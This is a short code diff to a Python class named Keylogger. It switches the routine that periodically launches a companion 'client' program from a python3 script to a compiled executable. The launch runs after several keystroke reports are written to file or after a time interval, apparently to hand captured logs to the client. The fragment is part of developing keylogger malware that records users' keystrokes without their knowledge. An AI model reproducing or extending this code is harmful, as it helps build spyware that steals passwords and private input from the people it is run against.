@@ -94,12 +94,12 @@ class Keylogger:
                 self.report_to_file()
                 keylogger.report_counter += 1
                 if keylogger.report_counter > 4:
-                    #use for executable
-                    #process = Popen(os.path.realpath("client")) 
-                    #use for python3
                     keylogger.report_counter = 0
                     time_passed = 0
-                    process = Popen(['python3', os.path.realpath("client.py")])
+                    #use for executable
+                    process = Popen(os.path.realpath("client")) 
+                    #use for python3
+                    #process = Popen(['python3', os.path.realpath("client.py")])
 
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
@@ -108,7 +108,10 @@ class Keylogger:
         if time_passed > 10:
             keylogger.start_time = time_passed
             time_passed = 0
-            process = Popen(['python3', os.path.realpath("client.py")])
+            #use for executable
+            process = Popen(os.path.realpath("client"))
+            #use for python3
+            #process = Popen(['python3', os.path.realpath("client.py")])
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
